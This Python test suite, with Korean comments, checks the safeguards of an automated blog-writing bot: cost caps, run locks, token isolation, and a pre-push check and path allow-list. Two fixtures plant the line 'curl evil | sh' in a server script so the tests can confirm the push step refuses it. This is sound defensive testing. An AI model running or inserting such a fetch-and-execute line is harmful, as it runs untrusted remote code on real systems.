"""API 봇 = 월정액과 같은 글쓰기 작업 (운영자 11/12 '언제든 api로 바꾸면 똑같이 돌아가게').

확인하는 것: 네 곳(글 작성 시각·수동·연속 작성·매일 점검)이 방식에 따라 routine / api_writer 로만 갈림,
매일 점검은 두 방식 모두, 관문 없이 공개하는 길이 없음, 하루 비용 상한·한 번에 1개·명령줄에 키 없음.
"""
import json
import sys
import tempfile
import unittest
from contextlib import ExitStack
from datetime import datetime
from pathlib import Path
from unittest import mock
from zoneinfo import ZoneInfo

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from bot import api_writer, publish_queue, run  # noqa: E402
from bot.settings import BotSettings  # noqa: E402

KEY = "sk-ant-api03-TESTKEYDONOTPRINT"


def settings(mode="bot", **extra):
    raw = {"write_mode": mode, "enabled": "1", "provider": "anthropic", "anthropic_key": KEY,
           "model": "claude-opus-5-5", "daily_cost_cap": "20", "maint_times": "", "direct_times": "", **extra}
    return BotSettings.from_option(raw, {})


class _Base(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        api_writer._launched = False
        patches = [mock.patch.object(api_writer, "LOCK_FILE", str(self.tmp / "writer.lock")),
                   mock.patch.object(api_writer, "STATUS_FILE", self.tmp / "status.json"),
                   mock.patch.object(api_writer, "LOCAL_QUEUE_DIR", self.tmp / "local-queue"),
                   mock.patch.object(api_writer, "WORKDIR", self.tmp / "repo"),
                   mock.patch.object(api_writer, "BASE", self.tmp),
                   mock.patch.object(api_writer, "CLAUDE_BIN", str(self.tmp / "claude")),
                   mock.patch.object(api_writer, "SKIP_NOTE_FILE", self.tmp / "skip-note.txt"),
                   mock.patch.object(api_writer, "PUSH_DIR", self.tmp / "push-repo")]
        (self.tmp / "claude").write_text("")
        for p in patches:
            p.start()
            self.addCleanup(p.stop)
        self.addCleanup(setattr, api_writer, "_launched", False)


class FixedDT(datetime):
    NOW = datetime(2026, 11, 12, 7, 41, tzinfo=ZoneInfo("Asia/Seoul"))

    @classmethod
    def now(cls, tz=None):
        return cls.NOW if tz else cls.NOW.replace(tzinfo=None)


class DispatchTest(_Base):
    """bot/run.py 의 네 곳이 fire_routine 한 곳을 거쳐 방식대로 갈리는지 (main 을 1분 실행처럼 돌림, 07:41)."""

    def run_main(self, s, manual=False, continuous=False, state=None, busy=False):
        state = state if state is not None else {"log": [], "dashboard_at": "2026-11-12 07:00"}
        quiet = {"save_state": None, "run_due_wp_cron": None, "purge_cache_if_changed": None, "pop_excluded": [],
                 "daily_review": None, "refresh_dashboard": None, "continuous_on": continuous, "writer2_on": True,
                 "set_continuous": None, "load_settings": s, "load_state": state}
        with ExitStack() as stack:  # 패치가 많아 with 한 줄로는 파이썬 3.10 의 중첩 한도를 넘음
            for name, value in quiet.items():
                stack.enter_context(mock.patch.object(run, name, return_value=value))
            stack.enter_context(mock.patch.object(run, "LOCK_FILE", str(self.tmp / "bot.lock")))
            stack.enter_context(mock.patch.object(run, "datetime", FixedDT))
            stack.enter_context(mock.patch.object(sys, "argv", ["bot.run"]))
            stack.enter_context(mock.patch("bot.server_stats.record", return_value=""))
            stack.enter_context(mock.patch.object(api_writer, "busy", return_value=busy))
            pop = stack.enter_context(mock.patch.object(run, "pop_manual_request", return_value=manual))
            api_fire = stack.enter_context(mock.patch.object(api_writer, "fire", return_value="시작"))
            cloud_fire = stack.enter_context(mock.patch.object(run.routine, "fire", return_value="https://claude.ai/x"))
            publish = stack.enter_context(mock.patch("bot.publisher.publish"))
            mark_ready = stack.enter_context(mock.patch("bot.schedule.mark_ready"))
            run.main()
        publish.assert_not_called()      # 1분 봇은 글을 직접 올리지 않음 (관문은 publish_queue)
        mark_ready.assert_not_called()
        return api_fire, cloud_fire, pop, state

    def check(self, mode, *expected_texts, **kw):
        api_fire, cloud_fire, _, state = self.run_main(settings(mode, **kw.pop("extra", {})), **kw)
        used, unused = (api_fire, cloud_fire) if mode == "bot" else (cloud_fire, api_fire)
        unused.assert_not_called()
        texts = [c.args[1] if mode == "bot" else c.args[2] for c in used.call_args_list]
        self.assertEqual(texts, list(expected_texts))
        self.assertTrue(state["log"][0]["ok"], state["log"][0])

    def test_four_call_sites_both_modes(self):
        for mode in ("bot", "direct"):
            with self.subTest(mode=mode, site="수동"):
                self.check(mode, "manual-request", manual=True)
            with self.subTest(mode=mode, site="글 작성 시각"):
                self.check(mode, "", extra={"direct_times": "07:40"})
            with self.subTest(mode=mode, site="매일 점검"):   # 11/12: 예전엔 월정액에서만 돌았음
                self.check(mode, "maintenance-check", extra={"maint_times": "07:40"})
            with self.subTest(mode=mode, site="연속 작성"):
                texts = [""] if mode == "bot" else ["slot-1", "slot-2"]   # 월정액은 두 칸, API 봇은 한 칸
                self.check(mode, *texts, continuous=True, state={"log": [], "dashboard_at": "2026-11-12 07:00"})

    def test_api_continuous_runs_one_slot(self):
        """API 봇은 서버 안에서 한 번에 1개 → 2번 칸을 시작하지 않음 (시작하면 '실행 중' 실패가 쌓여 연속 작성이 멈춤)."""
        api_fire, _, _, state = self.run_main(settings("bot"), continuous=True)
        self.assertEqual(api_fire.call_count, 1)
        self.assertNotIn("continuous_2", state)

    def test_busy_waits_and_keeps_request(self):
        """쓰는 중이면 시작하지 않고 미룸 — 수동 요청은 지우지 않고, 시각은 '했음'으로 적지 않음 (끝나면 3시간 안에 시작)."""
        api_fire, _, pop, state = self.run_main(settings("bot", direct_times="07:40", maint_times="07:40"), manual=True,
                                                busy=True)
        api_fire.assert_not_called()
        pop.assert_not_called()
        self.assertNotIn("direct_fired", state)
        self.assertNotIn("maint_fired", state)

    def test_api_off_switch_is_logged(self):
        s = settings("bot", enabled="0", direct_times="07:40")
        with mock.patch.object(api_writer, "_launch") as launch:
            state = {"log": []}
            self.assertFalse(run.fire_routine(state, s, "글 작성 07:40"))
        launch.assert_not_called()
        self.assertFalse(state["log"][0]["ok"])
        self.assertIn("API 봇 사용", state["log"][0]["msg"])

    def test_no_ungated_publish_path(self):
        """예전 API 봇 한 번 쓰기(create_one)는 관문 없이 공개 대기열에 넣었음 → 없앰."""
        self.assertFalse(hasattr(run, "create_one"))
        src = (ROOT / "bot" / "run.py").read_text(encoding="utf-8")
        for name in ("from .publisher import", "mark_ready", "write_article", "make_llm"):
            self.assertNotIn(name, src)


class StartGuardTest(_Base):
    def test_cost_cap_blocks_start(self):
        s = settings("bot", daily_cost_cap="5")
        self.assertIsNone(api_writer.start_problem(s, 1.0))
        self.assertAlmostEqual(api_writer.budget(s, 1.0), 4.0)           # 남은 몫이 이번 예산
        self.assertIn("하루 상한", api_writer.start_problem(s, 4.8))      # 0.5달러도 안 남음 → 내일
        with mock.patch.object(api_writer, "_launch") as launch:
            with self.assertRaises(api_writer.ApiWriterError):
                api_writer.fire(s, "", spent=5.0)
        launch.assert_not_called()
        self.assertEqual(api_writer.budget(settings("bot", daily_cost_cap="0"), 99), api_writer.RUN_MAX_USD)

    def test_cost_cap_rechecked_in_runner(self):
        logs = []
        with mock.patch("bot.settings.load_settings", return_value=settings("bot", daily_cost_cap="3")), \
                mock.patch("bot.state.load_state", return_value={"log": [], "spend": {datetime.now().strftime("%Y-%m-%d"): 3.0}}), \
                mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs.append((ok, msg))), \
                mock.patch.object(api_writer, "run_session") as session:
            self.assertEqual(api_writer.run_once("", "글 작성 07:40"), 1)
        session.assert_not_called()
        self.assertIn("하루 상한", logs[-1][1])

    def test_needs_anthropic_key_and_install(self):
        self.assertIn("Anthropic", api_writer.start_problem(settings("bot", provider="gemini"), 0))
        self.assertIn("키", api_writer.start_problem(settings("bot", anthropic_key=""), 0))
        with mock.patch.object(api_writer, "CLAUDE_BIN", str(self.tmp / "none")):
            self.assertIn("설치", api_writer.start_problem(settings("bot"), 0))

    def test_lock_prevents_double_run(self):
        self.assertFalse(api_writer.busy())
        with api_writer._lock() as got:
            self.assertTrue(got)
            self.assertTrue(api_writer.busy())
            with mock.patch.object(api_writer, "_launch") as launch, self.assertRaises(api_writer.ApiWriterError):
                api_writer.fire(settings("bot"), "")
            launch.assert_not_called()
            with mock.patch.object(api_writer, "run_session") as session:
                self.assertEqual(api_writer.run_once("", "x"), 1)   # 따로 실행도 잠금을 못 잡으면 바로 끝냄
            session.assert_not_called()
        self.assertFalse(api_writer.busy())                          # 끝나면(죽어도) 잠금이 풀림

    def test_same_minute_second_fire_refused(self):
        with mock.patch.object(api_writer, "_launch") as launch:
            api_writer.fire(settings("bot"), "manual-request")
            with self.assertRaises(api_writer.ApiWriterError):
                api_writer.fire(settings("bot"), "")
        self.assertEqual(launch.call_count, 1)
        self.assertTrue(all(KEY not in a for a in launch.call_args.args[0]))  # 따로 실행 명령에도 키 없음


class CommandTest(_Base):
    def test_command_has_model_not_key(self):
        cmd = api_writer.claude_command("claude-opus-5-5", 4.0, "slot-1")
        self.assertEqual(cmd[cmd.index("--model") + 1], "claude-opus-5-5")
        self.assertEqual(cmd[cmd.index("--max-budget-usd") + 1], "4.00")
        self.assertEqual(cmd[cmd.index("--permission-mode") + 1], "dontAsk")
        self.assertIn("automation/daily-writer.md", cmd[2])
        self.assertIn("slot-1", cmd[2])
        self.assertNotIn("--dangerously-skip-permissions", cmd)
        env = api_writer.writer_env(KEY, "tok")
        self.assertEqual(env["ANTHROPIC_API_KEY"], KEY)
        self.assertEqual(env["FIRSTLAB_LOCAL"], "1")
        self.assertNotIn("ANTHROPIC_API_KEY", api_writer.writer_env())   # git 명령에는 키 없음
        self.assertEqual(api_writer.redact(f"x {KEY} y", KEY), "x *** y")

    def fake_session(self, result: dict, write: dict):
        """claude -p 대신: 작업 저장소 queue 에 파일을 쓰고 결과 JSON 을 내놓음."""
        queue = self.tmp / "repo" / "wordpress" / "queue"
        queue.mkdir(parents=True, exist_ok=True)
        calls = {}

        class Proc:
            pid, returncode = 12345, 0

            def __init__(self, cmd, **kw):
                calls["cmd"], calls["kw"] = cmd, kw
                for name, data in write.items():
                    (queue / name).write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")

            def communicate(self, timeout=None):
                return json.dumps(result), ""
        return Proc, calls, queue

    def run_once(self, result, write, cap="20", text="slot-1"):
        Proc, calls, queue = self.fake_session(result, write)
        logs = []
        with mock.patch("bot.settings.load_settings", return_value=settings("bot", daily_cost_cap=cap)), \
                mock.patch("bot.state.load_state", return_value={"log": []}), \
                mock.patch("bot.config.load_secrets", return_value={"FIRSTLAB_API_TOKEN": "site-token"}), \
                mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs.append((ok, msg, cost))), \
                mock.patch.object(api_writer, "prepare_workdir"), \
                mock.patch.object(api_writer.subprocess, "Popen", Proc), \
                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env: sorted(queue.glob("*.json"))), \
                mock.patch.object(api_writer, "other_changes", return_value=[]), \
                mock.patch.object(publish_queue, "main") as publish, \
                mock.patch("bot.publish_queue._marker", return_value=self.tmp / "nomarker"):
            code = api_writer.run_once(text, "연속 작성 1번째")
        return code, calls, logs, publish

    def test_success_delivers_to_gates_and_records_cost(self):
        result = {"type": "result", "subtype": "success", "is_error": False, "total_cost_usd": 3.21, "result": "새 글 1편"}
        code, calls, logs, publish = self.run_once(result, {"new-post.json": {"keyword": "x", "status": "auto"}})
        self.assertEqual(code, 0)
        self.assertTrue(all(KEY not in a for a in calls["cmd"]))           # 명령줄에 키 없음
        self.assertEqual(calls["kw"]["env"]["ANTHROPIC_API_KEY"], KEY)     # 키는 환경 변수로만
        self.assertEqual(calls["kw"]["user"], api_writer.WRITER_USER)      # 권한 없는 전용 사용자
        self.assertTrue(calls["kw"]["start_new_session"])                  # 시간 초과 때 통째로 끝낼 수 있게
        publish.assert_called_once()                                       # 월정액과 같은 관문 (bot.publish_queue)
        local = sorted(p.name for p in (self.tmp / "local-queue").glob("*.json"))
        self.assertIn("new-post.json", local)
        done = [n for n in local if n.startswith("done-")]                # 끝 표시를 안 남겼으면 대신 (연속 작성용)
        self.assertEqual(len(done), 1)
        self.assertEqual(json.loads((self.tmp / "local-queue" / done[0]).read_text())["slot"], 1)
        self.assertTrue(logs[-1][0])
        self.assertAlmostEqual(logs[-1][2], 3.21)                          # add_spend → 하루 상한
        self.assertFalse((self.tmp / "status.json").exists())

    def test_maintenance_makes_no_done_file(self):
        """매일 점검은 글쓰기 실행이 아님 → 끝 표시를 대신 만들지 않음 (연속 작성이 '한 편 끝'으로 착각하지 않게). 보고는 봇 기록에."""
        result = {"type": "result", "subtype": "success", "is_error": False, "total_cost_usd": 0.3, "result": "이상 없음"}
        code, _, logs, publish = self.run_once(result, {}, text="maintenance-check")
        self.assertEqual(code, 0)
        publish.assert_not_called()
        self.assertFalse(list((self.tmp / "local-queue").glob("*.json")))
        self.assertIn("이상 없음", logs[-1][1])

    def test_failed_run_publishes_nothing(self):
        """끝까지 못 마친 실행(예산 초과·오류)의 결과는 버림 — 월정액도 마지막 push 전에 끊기면 아무것도 안 올라감."""
        result = {"type": "result", "subtype": "error_max_budget_usd", "is_error": True, "total_cost_usd": 4.0}
        code, _, logs, publish = self.run_once(result, {"half.json": {"keyword": "x"}})
        self.assertEqual(code, 1)
        publish.assert_not_called()
        self.assertFalse(list((self.tmp / "local-queue").glob("*.json")))
        self.assertFalse(logs[-1][0])
        self.assertIn("버림", logs[-1][1])
        self.assertAlmostEqual(logs[-1][2], 4.0)                           # 실패해도 쓴 비용은 셈

    def test_stale_status_is_reported(self):
        (self.tmp / "status.json").write_text(json.dumps({"started": "2026-11-12 03:00", "label": "글 작성 03:00"}))
        self.assertIn("멈춤", api_writer._stale_note())

    def test_only_new_queue_files_taken(self):
        dest = self.tmp / "local-queue"
        good, bad = self.tmp / "a.json", self.tmp / "b.json"
        good.write_text('{"type": "skip", "keywords": []}', encoding="utf-8")
        bad.write_text("not json", encoding="utf-8")
        self.assertEqual(api_writer.deliver([good, bad], dest), ["a.json"])
        self.assertEqual(api_writer.deliver([good], dest), [])            # 같은 내용은 다시 안 넣음


GH = "github_pat_TESTPUSHTOKENDONOTPRINT"
OK_RESULT = {"type": "result", "subtype": "success", "is_error": False, "total_cost_usd": 2.5, "result": "대기 글 검수 1편"}


class PushModeTest(CommandTest):
    """운영자 11/12 '대기 글 검수 결과 반영·새 계산기·연초 기준값도 api 모드에서': 서버 비밀값 GITHUB_PUSH_TOKEN 이 있으면
    세션은 다 하고(FIRSTLAB_LOCAL=push), root 쪽이 검사 통과 뒤 main 에 push. 토큰은 세션에 절대 안 감."""

    def run_push(self, write, push=None, secrets=None, text="slot-1"):
        Proc, calls, queue = self.fake_session(OK_RESULT, write)
        logs = []
        secrets = secrets if secrets is not None else {"FIRSTLAB_API_TOKEN": "site-token", "GITHUB_PUSH_TOKEN": GH}
        push = push or mock.Mock(return_value=("abc1234def", ["wordpress/queue/new-post.json"], []))
        with mock.patch("bot.settings.load_settings", return_value=settings("bot")), \
                mock.patch("bot.state.load_state", return_value={"log": [], "review_target": {"post_id": 7}, "calc_yearly": [1, 2]}), \
                mock.patch("bot.config.load_secrets", return_value=secrets), \
                mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs.append((ok, msg, cost))), \
                mock.patch.object(api_writer, "prepare_workdir"), \
                mock.patch.object(api_writer, "head_sha", return_value="base000"), \
                mock.patch.object(api_writer.subprocess, "Popen", Proc), \
                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env: sorted(queue.glob("*.json"))), \
                mock.patch.object(api_writer, "other_changes", return_value=[]), \
                mock.patch.object(api_writer, "write_done_in_workdir", return_value=None), \
                mock.patch.object(api_writer, "push_changes", push), \
                mock.patch.object(publish_queue, "main") as publish, \
                mock.patch("bot.publish_queue._marker", return_value=self.tmp / "nomarker"):
            code = api_writer.run_once(text, "글 작성 07:40")
        return code, calls, logs, publish, push

    def local(self):
        return sorted(p.name for p in (self.tmp / "local-queue").glob("*.json"))

    def test_token_never_reaches_session(self):
        code, calls, logs, publish, push = self.run_push({"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"}})
        self.assertEqual(code, 0)
        self.assertTrue(all(GH not in a for a in calls["cmd"]))               # 명령줄에 없음
        self.assertTrue(all(GH not in v for v in calls["kw"]["env"].values()))  # 세션 환경에도 없음
        self.assertNotIn("GITHUB_PUSH_TOKEN", calls["kw"]["env"])
        self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "push")
        self.assertIn("FIRSTLAB_LOCAL=push", calls["cmd"][2])
        env, base, token, _msg = push.call_args.args
        self.assertEqual((base, token), ("base000", GH))                       # 토큰은 root 쪽 push 에만
        self.assertTrue(all(GH not in v for v in env.values()))                # 작업 폴더 git 명령 환경에도 없음
        self.assertTrue(all(GH not in m for _, m, _ in logs))

    def test_pushed_files_not_double_posted(self):
        """올렸으면 queue 파일은 배포가 올림 → 서버 대기 폴더로 넣지 않음 (같은 글 두 번 방지)."""
        code, _, logs, publish, push = self.run_push({"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"}})
        push.assert_called_once()
        self.assertEqual(self.local(), [])
        publish.assert_not_called()
        self.assertTrue(logs[-1][0])
        self.assertIn("main 에 올림 abc1234", logs[-1][1])

    def test_failed_checks_push_nothing_but_keep_posts(self):
        """검사 실패 → 아무것도 안 올림, 봇 기록에 실패한 검사 이름, 새 글·끝 표시는 대기 폴더로 (글이 안 사라짐),
        검수 끝 파일은 버림 (고친 내용이 저장소에 없는데 '검수 끝'·'공개 직전 재검수 끝'으로 처리되면 안 됨)."""
        failing = mock.Mock(side_effect=api_writer.PushFailed("검사 실패", ["BotTest.test_calc_rates"]))
        code, _, logs, publish, _ = self.run_push(
            {"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"},
             "reviewdone-7-1.json": {"type": "review_done", "post_id": 7, "prepublish": True}}, push=failing)
        self.assertEqual(self.local(), ["done-1.json", "new-post.json"])
        publish.assert_called_once()
        fail = [m for ok, m, _ in logs if not ok]
        self.assertTrue(any("BotTest.test_calc_rates" in m and "main 에 안 올림" in m and "검수 끝 파일 1개는 버림" in m for m in fail), fail)
        self.assertTrue(logs[-1][0])   # 세션 자체는 성공 (다음 실행이 새 main 에서 다시 — 영원히 막히지 않음)

    def test_unexpected_push_error_also_falls_back(self):
        boom = mock.Mock(side_effect=OSError(f"연결 끊김 {GH}"))
        _, _, logs, publish, _ = self.run_push({"new-post.json": {"keyword": "x"}}, push=boom)
        self.assertEqual(self.local(), ["new-post.json"])
        self.assertTrue(all(GH not in m for _, m, _ in logs))   # 오류 문구에 토큰이 섞여도 가림

    def test_no_token_keeps_old_path_and_notes_once_a_day(self):
        push = mock.Mock()
        for run_no in range(2):
            code, calls, logs, publish, _ = self.run_push({"new-post.json": {"keyword": "x"}}, push=push,
                                                          secrets={"FIRSTLAB_API_TOKEN": "site-token"})
            self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "1")
            notes = [m for ok, m, _ in logs if "GITHUB_PUSH_TOKEN" in m]
            if run_no == 0:
                self.assertEqual(len(notes), 1)
                self.assertIn("대기 글 검수 1건, 연초 기준값 2건", notes[0])
                self.assertIn("set-secrets.sh GITHUB_PUSH_TOKEN", notes[0])
            else:
                self.assertEqual(notes, [])        # 같은 날 두 번째 실행은 알림 안 함
        push.assert_not_called()
        self.assertIn("new-post.json", self.local())


def _plain_writer(cmd, env, timeout=300, cwd=None, binary=False):
    """테스트용 _as_writer: 사용자 전환 없이 같은 명령 (CI 는 root 가 아님)."""
    return api_writer.subprocess.run(cmd, cwd=cwd or api_writer.WORKDIR, env=env, capture_output=True, text=not binary,
                                     timeout=timeout)


class PushGitTest(_Base):
    """진짜 git 으로: 작업 폴더 → 검사 → root 쪽 bare 저장소 → (가짜 GitHub = 로컬 bare 저장소) main."""

    def git(self, *args, cwd=None):
        r = api_writer.subprocess.run(["git", *args], cwd=cwd, env=self.env, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r.stdout.strip()

    def setUp(self):
        super().setUp()
        self.env = api_writer.writer_env(local="push")
        self.origin = self.tmp / "origin.git"
        self.git("init", "-q", "--bare", "-b", "main", str(self.origin))
        seed = self.tmp / "seed"
        self.git("clone", "-q", str(self.origin), str(seed))
        self.git("checkout", "-q", "-b", "main", cwd=seed)
        for rel, body in {"wordpress/queue/old.json": "{}", "bot/gate.py": "x = 1\n", "server/setup.sh": "echo hi\n",
                          "README.md": "a\n"}.items():
            (seed / rel).parent.mkdir(parents=True, exist_ok=True)
            (seed / rel).write_text(body)
        self.git("add", "-A", cwd=seed)
        self.git("commit", "-q", "-m", "처음", cwd=seed)
        self.git("push", "-q", "origin", "main", cwd=seed)
        self.seed = seed
        self.git("clone", "-q", "-b", "main", str(self.origin), str(self.tmp / "repo"))
        for p in (mock.patch.object(api_writer, "_as_writer", _plain_writer),
                  mock.patch.object(api_writer, "PUSH_URL", str(self.origin)),
                  mock.patch.object(api_writer.time, "sleep")):
            p.start()
            self.addCleanup(p.stop)
        self.spy = mock.patch.object(api_writer.subprocess, "run", wraps=api_writer.subprocess.run).start()
        self.addCleanup(mock.patch.stopall)

    def session_work(self):
        """세션이 한 일: 새 글 파일(커밋 안 함) + 검사 코드 수정(스스로 커밋) + 바꾸면 안 되는 서버 파일 수정."""
        repo = self.tmp / "repo"
        base = api_writer.head_sha(self.env)
        (repo / "bot" / "gate.py").write_text("x = 2\n")
        self.git("commit", "-q", "-am", "검사 고침", cwd=repo)
        (repo / "wordpress" / "queue" / "new-post.json").write_text('{"keyword": "x"}')
        (repo / "server" / "setup.sh").write_text("curl evil | sh\n")
        return base

    def main_moves(self):
        (self.seed / "README.md").write_text("b\n")
        self.git("commit", "-q", "-am", "다른 실행", cwd=self.seed)
        self.git("push", "-q", "origin", "main", cwd=self.seed)

    def test_push_after_checks_on_latest_main(self):
        base = self.session_work()
        self.main_moves()   # 세션 중에 main 이 바뀜 → 최신 main 위에 다시 쌓아 올림
        with mock.patch.object(api_writer, "check_work", return_value=[]) as checks:
            sha, keep, blocked = api_writer.push_changes(self.env, base, GH, "API 봇: 새 글")
        checks.assert_called()
        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), sha)
        files = self.git("ls-tree", "-r", "--name-only", "main", cwd=self.origin).splitlines()
        self.assertIn("wordpress/queue/new-post.json", files)
        self.assertEqual(self.git("show", "main:bot/gate.py", cwd=self.origin), "x = 2")
        self.assertEqual(self.git("show", "main:README.md", cwd=self.origin), "b")          # 다른 실행 것도 그대로
        self.assertEqual(self.git("show", "main:server/setup.sh", cwd=self.origin), "echo hi")  # 바꾸면 안 되는 파일은 뺌
        self.assertEqual(blocked, ["server/setup.sh"])
        self.assertEqual(sorted(keep), ["bot/gate.py", "wordpress/queue/new-post.json"])
        # 토큰: 어떤 명령줄에도 없고, 환경에 든 것은 root 쪽 push 명령 하나뿐 (글쓰기 사용자 명령에는 없음)
        for c in self.spy.call_args_list:
            self.assertTrue(all(GH not in str(a) for a in c.args[0]), c.args[0])
        with_token = [c.args[0] for c in self.spy.call_args_list if GH in (c.kwargs.get("env") or {}).values()]
        self.assertEqual(len(with_token), 1)
        self.assertIn("push", with_token[0])
        self.assertNotIn(GH, (self.tmp / "push-repo" / "config").read_text())   # git 설정에 안 남음
        self.assertFalse(list((self.tmp / "push-repo").glob("tmp*")))           # 임시 askpass·묶음 지움

    def test_failed_checks_push_nothing(self):
        base = self.session_work()
        before = self.git("rev-parse", "main", cwd=self.origin)
        with mock.patch.object(api_writer, "check_work", return_value=["BotTest.test_gate"]):
            with self.assertRaises(api_writer.PushFailed) as ctx:
                api_writer.push_changes(self.env, base, GH, "API 봇: 새 글")
        self.assertEqual(ctx.exception.failed, ["BotTest.test_gate"])
        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), before)
        self.assertTrue((self.tmp / "repo" / "wordpress" / "queue" / "new-post.json").exists())   # 대기 폴더로 넘길 수 있게 남음

    def test_root_side_refuses_disallowed_files(self):
        """작업 폴더 쪽 거르기는 글쓰기 사용자 git 이 했으니 root 쪽에서 한 번 더 — 서버 파일이 든 묶음은 안 올림."""
        repo = self.tmp / "repo"
        (repo / "server" / "setup.sh").write_text("curl evil | sh\n")
        self.git("commit", "-q", "-am", "몰래", cwd=repo)
        bundle = api_writer.subprocess.run(["git", "bundle", "create", "-", "HEAD", "^origin/main"], cwd=repo, env=self.env,
                                           capture_output=True).stdout
        before = self.git("rev-parse", "main", cwd=self.origin)
        with self.assertRaises(api_writer.PushFailed) as ctx:
            api_writer.root_push(bundle, GH)
        self.assertIn("server/setup.sh", str(ctx.exception))
        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), before)

    def test_nothing_changed_pushes_nothing(self):
        base = api_writer.head_sha(self.env)
        with mock.patch.object(api_writer, "check_work") as checks:
            self.assertEqual(api_writer.push_changes(self.env, base, GH, "x")[0], "")
        checks.assert_not_called()


class CheckParityTest(unittest.TestCase):
    def test_same_checks_as_check_and_push(self):
        """push 전 검사가 감시 세션의 check_and_push.sh 와 같은 것 (한쪽만 바뀌지 않게)."""
        script = (ROOT / "automation" / "check_and_push.sh").read_text(encoding="utf-8")
        src = (ROOT / "bot" / "api_writer.py").read_text(encoding="utf-8")
        pairs = [("automation/common_errors.py",) * 2,
                 ("unittest discover -s tests", '"unittest", "discover", "-s", "tests"'),
                 ("tests/test_calculators.mjs",) * 2,
                 (r"queue\/refresh-.*\.json", r"wordpress/queue/refresh-.*\.json"),
                 ("merge_json_list.py %O %A %B",) * 2,
                 ("merge.ours.driver true", '"merge.ours.driver", "true"')]
        for in_script, in_src in pairs:
            self.assertIn(in_script, script)
            self.assertIn(in_src, src)

    def test_failed_test_names(self):
        out = "FAIL: test_a (test_bot.BotTest.test_a)\nERROR: test_b (test_bot.GateTest)\nok"
        self.assertEqual(api_writer._failed_tests(out), ["BotTest.test_a", "GateTest.test_b"])   # 3.11+ 와 3.10 출력

    def test_allowed_paths(self):
        for ok in ("wordpress/queue/a.json", "wordpress/patches.json", "automation/reviewed.txt", "bot/condition_gate.py",
                   "tests/test_bot.py", "wordpress/themes/first-lab/calculators/data/x.json", "wordpress/pages/x-calculator.html"):
            self.assertTrue(api_writer.push_allowed(ok), ok)
        for bad in ("server/setup.sh", ".github/workflows/deploy.yml", "CLAUDE.md", "automation/daily-writer.md",
                    "wordpress/mu-plugins/first-lab-api.php", "bot/api_writer.py", "bot/config.py"):
            self.assertFalse(api_writer.push_allowed(bad), bad)


class WiringTest(unittest.TestCase):
    def test_publish_queue_reads_local_results(self):
        self.assertEqual(api_writer.LOCAL_QUEUE_DIR, publish_queue.LOCAL_QUEUE_DIR)
        with tempfile.TemporaryDirectory() as d:
            q, local, done = Path(d, "q"), Path(d, "local"), Path(d, "done")
            for p in (q, local, done):
                p.mkdir()
            (q / "b.json").write_text("{}")
            (local / "a.json").write_text("{}")
            with mock.patch.object(publish_queue, "QUEUE_DIR", q), mock.patch.object(publish_queue, "LOCAL_QUEUE_DIR", local), \
                    mock.patch.object(publish_queue, "DONE_DIR", done):
                self.assertEqual([p.name for p in publish_queue.pending()], ["a.json", "b.json"])

    def test_instructions_and_settings_describe_api_mode(self):
        writer = (ROOT / "automation" / "daily-writer.md").read_text(encoding="utf-8")
        self.assertIn("FIRSTLAB_LOCAL=1", writer)
        self.assertIn("FIRSTLAB_LOCAL=push", writer)
        self.assertIn("FIRSTLAB_LOCAL=1", api_writer.claude_command("m", 1, "")[2])
        self.assertIn("FIRSTLAB_LOCAL=push", api_writer.claude_command("m", 1, "", "push")[2])
        page = (ROOT / "wordpress" / "mu-plugins" / "first-lab-bot-settings.php").read_text(encoding="utf-8")
        self.assertIn("GITHUB_PUSH_TOKEN", page)   # 설정 화면 설명에 토큰 이야기 (토큰 입력 칸은 없음 — 서버 비밀값으로만)
        self.assertNotIn("github_push_token", page)
        self.assertIn("요금만 다름", page)
        self.assertNotIn("API 봇이 1~3분 안에", page)

    def test_server_installs_pinned_cli_where_writer_looks(self):
        setup = (ROOT / "server" / "bot-setup.sh").read_text(encoding="utf-8")
        self.assertRegex(setup, r"CLAUDE_VER=\d+\.\d+\.\d+")
        self.assertRegex(setup, r"NODE_SHA256=[0-9a-f]{64}")
        self.assertIn(str(Path(api_writer.CLAUDE_BIN).parent.parent), setup)   # --prefix /opt/first-lab-claude
        self.assertIn(api_writer.WRITER_USER, setup)
        self.assertIn(str(publish_queue.LOCAL_QUEUE_DIR), setup)

    def test_writer_timeout_shorter_than_continuous(self):
        self.assertLess(api_writer.RUN_TIMEOUT_MIN, run.CONTINUOUS_TIMEOUT_MIN)


if __name__ == "__main__":
    unittest.main()
